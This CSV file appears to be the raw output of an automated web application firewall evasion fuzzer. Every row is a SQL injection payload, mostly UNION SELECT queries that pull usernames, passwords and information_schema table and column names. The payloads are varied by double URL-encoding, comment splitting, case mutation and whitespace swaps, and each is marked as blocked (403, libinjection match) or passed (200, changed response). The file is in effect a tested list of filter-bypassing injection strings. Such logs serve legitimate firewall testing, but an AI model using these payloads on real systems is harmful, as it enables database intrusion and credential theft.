depth,category,label,reason,confidence,status,length,elapsed,input_preview,parent_preview
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00558,1%2520union%2520select%2520username%252cpassword%2520from%2520users,1%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4682,0.00524,1%2520%252555%25254e%252549ON%2520%252553ELEC%252554%2520u%252573%252565%252572nam%252565%252Cpas%252573word%2520%252546,"1 %55%4e%49ON %53ELEC%54 u%73%65%72nam%65,pas%73word %46RO%4d u%73ers"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00449,"1+%55%4e%49ON %53ELEC%54
u%73%65%72nam%65,pas%73word %46RO%4d	u%73ers","1 %55%4e%49ON %53ELEC%54 u%73%65%72nam%65,pas%73word %46RO%4d u%73ers"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00325,"1 %55%4e%49oN %53eLeC%54 u%73%65%72nAm%65,PaS%73WoRd %46Ro%4D U%73ErS","1 %55%4e%49ON %53ELEC%54 u%73%65%72nam%65,pas%73word %46RO%4d u%73ers"
2,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4632,0.00593,"1 %55%4%65%49ON %53%45L%45%43%54 u%73%65%72n%61%6d%65,%70%61s%73w%6fr%64 %46%52O%4%64 %75%73ers","1 %55%4e%49ON %53ELEC%54 u%73%65%72nam%65,pas%73word %46RO%4d u%73ers"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4606,0.00583,1%252BUNION%252509SELECT%250Ausername%252Cpassword%2520FROM%2520users,"1+UNION%09SELECT
username,password FROM users"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4598,0.00581,"1+UN/**/ION%09SELECT
use/**/rname,password F/**/ROM use/**/rs","1+UNION%09SELECT
username,password FROM users"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00319,"1+UnIoN%09SeLeCt
uSeRnAmE,PaSsWoRd fRoM UsErS","1+UNION%09SELECT
username,password FROM users"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00349,"1+%55N%49%4fN%09%53E%4cE%43T
%75s%65%72%6eame,passw%6f%72d FR%4f%4d us%65r%73","1+UNION%09SELECT
username,password FROM users"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00329,"1+UNION%09SELECT
username,password%09FROM%09users","1+UNION%09SELECT
username,password FROM users"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00493,1%2520UnIoN%2520SeLeCt%2520uSeRnAmE%252CPaSsWoRd%2520fRoM%2520UsErS,"1 UnIoN SeLeCt uSeRnAmE,PaSsWoRd fRoM UsErS"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00503,"1 Un/**/IoN Se/**/LeCt uSe/**/RnAmE,PaSsWoRd fR/**/oM Us/**/ErS","1 UnIoN SeLeCt uSeRnAmE,PaSsWoRd fRoM UsErS"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00341,"1 U%6eIo%4e S%65LeC%74 u%53e%52%6eAm%45,PaS%73%57o%52d fRoM UsErS","1 UnIoN SeLeCt uSeRnAmE,PaSsWoRd fRoM UsErS"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00313,"1+UnIoN SeLeCt
uSeRnAmE,PaSsWoRd fRoM%09UsErS","1 UnIoN SeLeCt uSeRnAmE,PaSsWoRd fRoM UsErS"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00473,"1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs","1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4601,0.00504,"1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs ","1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00528,"1 UNIO/**/N SELEC/**/T US/**/ERNAME,PASSWORD FRO/**/M USE/**/RS","1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00488,"1 unio/**/n selec/**/t us/**/ername,password fro/**/m use/**/rs","1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4619,0.00473,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4620,0.00535,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables ,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4619,0.00545,1%2520UNION%2520SELECT%2520TABLE_NAME%252C2%2520FROM%2520INFORMATION_SCHEMA.TABLES,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4619,0.00497,1%2520union%2520select%2520table_name%252c2%2520from%2520information_schema.tables,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4739,0.0053,1%2520UN%252549%25254fN%2520%252553ELECT%2520%252574a%252562l%252565_%25256eame%252C2%2520%252546ROM%2520%252569%25256ef,"1 UN%49%4fN %53ELECT %74a%62l%65_%6eame,2 %46ROM %69%6efo%72ma%74%69%6fn_sc%68e%6d%61.%74a%62%6ces"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00376,"1 UN%49%4fN/**/%53ELECT	%74a%62l%65_%6eame,2 %46ROM/**/%69%6efo%72ma%74%69%6fn_sc%68e%6d%61.%74a%62%6ces","1 UN%49%4fN %53ELECT %74a%62l%65_%6eame,2 %46ROM %69%6efo%72ma%74%69%6fn_sc%68e%6d%61.%74a%62%6ces"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00362,"1 Un%49%4fN %53eLeCt %74A%62L%65_%6eAmE,2 %46rOm %69%6EfO%72Ma%74%69%6Fn_sC%68E%6d%61.%74a%62%6cEs","1 UN%49%4fN %53ELECT %74a%62l%65_%6eame,2 %46ROM %69%6efo%72ma%74%69%6fn_sc%68e%6d%61.%74a%62%6ces"
2,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4663,0.00502,"1 UN%49%4%66%4e %53ELE%43T %74%61%62%6c%65_%6%65am%65,2 %46%52%4f%4d %69%6%65fo%72m%61%74%69%6f%6e_sc%68%65%6d%61.%74a%6","1 UN%49%4fN %53ELECT %74a%62l%65_%6eame,2 %46ROM %69%6efo%72ma%74%69%6fn_sc%68e%6d%61.%74a%62%6ces"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4623,0.00512,1%250AUNION%252509SELECT%252509table_name%252C2%2509FROM%2520information_schema.tables,"1
UNION%09SELECT%09table_name,2	FROM information_schema.tables"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00508,"1
U/**/NION%09SELECT%09table_name,2	FRO/**/M i/**/nformation_schema.tables","1
UNION%09SELECT%09table_name,2	FROM information_schema.tables"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00303,"1
UnIoN%09SeLeCt%09tAbLe_nAmE,2	FrOm iNfOrMaTiOn_sChEmA.TaBlEs","1
UNION%09SELECT%09table_name,2	FROM information_schema.tables"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00328,"1
%55%4eION%09%53%45%4cE%43T%09%74%61ble_%6eam%65,2	%46%52OM informatio%6e_sche%6da.t%61%62%6c%65%73","1
UNION%09SELECT%09table_name,2	FROM information_schema.tables"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4619,0.00561,1%2520UnIoN%2520SeLeCt%2520tAbLe_nAmE%252C2%2520FrOm%2520iNfOrMaTiOn_sChEmA.TaBlEs,"1 UnIoN SeLeCt tAbLe_nAmE,2 FrOm iNfOrMaTiOn_sChEmA.TaBlEs"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.0053,"1 Un/**/IoN Se/**/LeCt tAbLe_nAmE,2 FrO/**/m i/**/NfOrMaTiOn_sChEmA.TaBlEs","1 UnIoN SeLeCt tAbLe_nAmE,2 FrOm iNfOrMaTiOn_sChEmA.TaBlEs"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0031,"1 %55n%49%6f%4e SeLeC%74 %74A%62L%65_%6e%41%6dE,2 Fr%4f%6d %69NfOrMaT%69%4fn_%73Ch%45%6d%41.TaBlE%73","1 UnIoN SeLeCt tAbLe_nAmE,2 FrOm iNfOrMaTiOn_sChEmA.TaBlEs"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00462,"1 UnIoN+SeLeCt tAbLe_nAmE,2 FrOm iNfOrMaTiOn_sChEmA.TaBlEs","1 UnIoN SeLeCt tAbLe_nAmE,2 FrOm iNfOrMaTiOn_sChEmA.TaBlEs"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00505,"1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables","1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4612,0.00538,"1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables ","1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00513,"1 UNI/**/ON SEL/**/ECT TABLE_NAME,2 F/**/ROM I/**/NFORMATION_SCHEMA.TABLES","1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00527,"1 uni/**/on sel/**/ect table_name,2 f/**/rom i/**/nformation_schema.tables","1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00501,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4622,0.0055,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns ,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00552,1%2520UNION%2520SELECT%2520COLUMN_NAME%252C2%2520FROM%2520INFORMATION_SCHEMA.COLUMNS,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00524,1%2520union%2520select%2520column_name%252c2%2520from%2520information_schema.columns,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4723,0.00523,1%2520U%25254eIO%25254e%2520SEL%252545CT%2520c%25256flumn_%25256eame%252C2%2520FR%25254f%25254d%2520in%252566o%252572m%2,"1 U%4eIO%4e SEL%45CT c%6flumn_%6eame,2 FR%4f%4d in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
2,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00347,"1 U%4eIO%4e SEL%45CT c%6flumn_%6eame,2 FR%4f%4d i/**/n%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns","1 U%4eIO%4e SEL%45CT c%6flumn_%6eame,2 FR%4f%4d in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00331,"1/**/U%4eIO%4e SEL%45CT%0ac%6flumn_%6eame,2/**/FR%4f%4d
in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns","1 U%4eIO%4e SEL%45CT c%6flumn_%6eame,2 FR%4f%4d in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00362,"1 U%4eIo%4E SeL%45Ct c%6FlUmN_%6EaMe,2 fR%4f%4D In%66o%72m%61%74%69o%6E_ScH%65M%61.c%6FlU%6dNs","1 U%4eIO%4e SEL%45CT c%6flumn_%6eame,2 FR%4f%4d in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00347,"1 U%4eIO%4e SE%4c%45%43T %63%6%66l%75mn_%6%65ame,2 F%52%4f%4d i%6e%66o%72%6d%61%74%69o%6e_%73%63h%65%6d%61.c%6%66%6cu%6%","1 U%4eIO%4e SEL%45CT c%6flumn_%6eame,2 FR%4f%4d in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00509,1%252BUNION%2509SELECT%2509column_name%252C2%252BFROM%2520information_schema.columns,"1+UNION	SELECT	column_name,2+FROM information_schema.columns"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4613,0.00511,"1+UNIO/**/N	SELE/**/CT	column_name,2+FRO/**/M i/**/nformation_schema.columns","1+UNION	SELECT	column_name,2+FROM information_schema.columns"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00331,"1+UnIoN	SeLeCt	cOlUmN_NaMe,2+fRoM InFoRmAtIoN_ScHeMa.cOlUmNs","1+UNION	SELECT	column_name,2+FROM information_schema.columns"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00319,"1+UNIO%4e	SELECT	c%6f%6c%75%6dn_na%6de,2+F%52OM %69n%66orm%61ti%6fn_%73%63hema.co%6cu%6dns","1+UNION	SELECT	column_name,2+FROM information_schema.columns"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00493,1%2520UnIoN%2520SeLeCt%2520cOlUmN_NaMe%252C2%2520fRoM%2520InFoRmAtIoN_ScHeMa.cOlUmNs,"1 UnIoN SeLeCt cOlUmN_NaMe,2 fRoM InFoRmAtIoN_ScHeMa.cOlUmNs"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4613,0.00482,"1 U/**/nIoN SeL/**/eCt cOlUmN_NaMe,2 fRo/**/M I/**/nFoRmAtIoN_ScHeMa.cOlUmNs","1 UnIoN SeLeCt cOlUmN_NaMe,2 fRoM InFoRmAtIoN_ScHeMa.cOlUmNs"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00344,"1 %55n%49oN %53eLe%43%74 c%4f%6cU%6d%4e_NaMe,2 %66Ro%4d InFoRm%41%74IoN_ScHe%4d%61.c%4flUm%4es","1 UnIoN SeLeCt cOlUmN_NaMe,2 fRoM InFoRmAtIoN_ScHeMa.cOlUmNs"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0032,"1
UnIoN
SeLeCt%0acOlUmN_NaMe,2+fRoM InFoRmAtIoN_ScHeMa.cOlUmNs","1 UnIoN SeLeCt cOlUmN_NaMe,2 fRoM InFoRmAtIoN_ScHeMa.cOlUmNs"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4613,0.00518,"1 UN/**/ION SE/**/LECT column_name,2 F/**/ROM i/**/nformation_schema.columns","1 UN/**/ION SE/**/LECT column_name,2 F/**/ROM i/**/nformation_schema.columns"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4614,0.00504,"1 UN/**/ION SE/**/LECT column_name,2 F/**/ROM i/**/nformation_schema.columns ","1 UN/**/ION SE/**/LECT column_name,2 F/**/ROM i/**/nformation_schema.columns"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4613,0.00509,"1 UN/**/ION SE/**/LECT COLUMN_NAME,2 F/**/ROM I/**/NFORMATION_SCHEMA.COLUMNS","1 UN/**/ION SE/**/LECT column_name,2 F/**/ROM i/**/nformation_schema.columns"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4613,0.00536,"1 un/**/ion se/**/lect column_name,2 f/**/rom i/**/nformation_schema.columns","1 UN/**/ION SE/**/LECT column_name,2 F/**/ROM i/**/nformation_schema.columns"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4578,0.0047,1%2527%2520UNION%2520SELECT%25201%252C2--,1%2527%2520UNION%2520SELECT%25201%252C2--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4579,0.00521,1%2527%2520UNION%2520SELECT%25201%252C2-- ,1%2527%2520UNION%2520SELECT%25201%252C2--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4578,0.00606,1%2527%2520union%2520select%25201%252c2--,1%2527%2520UNION%2520SELECT%25201%252C2--
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4608,0.00583,1%2527%2520%252555N%252549%25254fN%2520SE%25254c%252545CT%25201%252C2--,"1' %55N%49%4fN SE%4c%45CT 1,2--"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00308,"1'+%55N%49%4fN%09SE%4c%45CT+1,2--","1' %55N%49%4fN SE%4c%45CT 1,2--"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00333,"1' %55N%49%4Fn sE%4c%45cT 1,2--","1' %55N%49%4fN SE%4c%45CT 1,2--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00383,"1' %55%4e%49%4fN SE%4c%45%43%54 1,2--","1' %55N%49%4fN SE%4c%45CT 1,2--"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4585,0.00518,1%2527%2520UNION/%252A%252A/SELECT%25201%252C2--,"1' UNION/**/SELECT 1,2--"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,189,0.00521,"1' UNI/**/ON/**/S/**/ELECT 1,2--","1' UNION/**/SELECT 1,2--"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00339,"1' uNiOn/**/SeLeCt 1,2--","1' UNION/**/SELECT 1,2--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00319,"1' UNION/**/S%45LEC%54 1,2--","1' UNION/**/SELECT 1,2--"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00345,"1' UNION/**/SELECT+1,2--","1' UNION/**/SELECT 1,2--"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4578,0.00524,1%2527%2520uNiOn%2520sElEcT%25201%252C2--,"1' uNiOn sElEcT 1,2--"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,186,0.00515,"1' uNiO/**/n sE/**/lEcT 1,2--","1' uNiOn sElEcT 1,2--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0035,"1' %75N%69On %73ElE%63T 1,2--","1' uNiOn sElEcT 1,2--"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00302,"1'%0auNiOn sElEcT/**/1,2--","1' uNiOn sElEcT 1,2--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,186,0.00495,"1' UNI/**/ON SELEC/**/T 1,2--","1' UNI/**/ON SELEC/**/T 1,2--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,187,0.0051,"1' UNI/**/ON SELEC/**/T 1,2-- ","1' UNI/**/ON SELEC/**/T 1,2--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,186,0.00489,"1' uni/**/on selec/**/t 1,2--","1' UNI/**/ON SELEC/**/T 1,2--"
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00592,1%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--,1%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4612,0.00523,1%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users-- ,1%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00558,1%2527%2520UNION%2520SELECT%2520USERNAME%252CPASSWORD%2520FROM%2520USERS--,1%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--
2,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00547,1%2527%2520union%2520select%2520username%252cpassword%2520from%2520users--,1%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4671,0.00543,1%2527%2520UN%252549O%25254e%2520%252553%252545LECT%2520u%252573ern%252561%25256de%252C%252570as%252573word%2520FROM%252,"1' UN%49O%4e %53%45LECT u%73ern%61%6de,%70as%73word FROM %75sers--"
2,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.0035,"1' UN%49O%4e %53%45LECT u%73ern%61%6de,%70as%73word F/**/ROM %75sers--","1' UN%49O%4e %53%45LECT u%73ern%61%6de,%70as%73word FROM %75sers--"
2,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00351,"1'%09UN%49O%4e %53%45LECT u%73ern%61%6de,%70as%73word%09FROM
%75sers--","1' UN%49O%4e %53%45LECT u%73ern%61%6de,%70as%73word FROM %75sers--"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00348,"1' uN%49O%4e %53%45lEcT U%73ErN%61%6De,%70As%73wOrD FrOm %75SeRs--","1' UN%49O%4e %53%45LECT u%73ern%61%6de,%70as%73word FROM %75sers--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00374,"1' %55%4e%49O%4e %53%45%4cEC%54 %75%73e%72%6e%61%6d%65,%70%61s%73wo%72%64 FRO%4d %75ser%73--","1' UN%49O%4e %53%45LECT u%73ern%61%6de,%70as%73word FROM %75sers--"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4615,0.00526,1%2527%250AUNION%25250aSELECT%252509username%252Cpassword%2520FROM%252Busers--,"1'
UNION%0aSELECT%09username,password FROM+users--"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,219,0.00502,"1'
UNIO/**/N%0aSELECT%09username,password FR/**/OM+u/**/sers--","1'
UNION%0aSELECT%09username,password FROM+users--"
2,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00369,"1'
uNiOn%0AsElEcT%09UsErNaMe,pAsSwOrD FrOm+uSeRs--","1'
UNION%0aSELECT%09username,password FROM+users--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00365,"1'
%55%4e%49ON%0aSELE%43T%09u%73er%6e%61m%65,%70as%73wo%72%64 F%52OM+u%73er%73--","1'
UNION%0aSELECT%09username,password FROM+users--"
2,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00561,1%2527%2520uNiOn%2520sElEcT%2520UsErNaMe%252CpAsSwOrD%2520FrOm%2520uSeRs--,"1' uNiOn sElEcT UsErNaMe,pAsSwOrD FrOm uSeRs--"
2,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,223,0.00558,"1' u/**/NiOn sElE/**/cT Us/**/ErNaMe,pAsSwOrD FrO/**/m uS/**/eRs--","1' uNiOn sElEcT UsErNaMe,pAsSwOrD FrOm uSeRs--"
2,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00426,"1' %75N%69O%6e %73E%6cEcT U%73Er%4ea%4de,%70AsSw%4frD F%72Om %75SeRs--","1' uNiOn sElEcT UsErNaMe,pAsSwOrD FrOm uSeRs--"
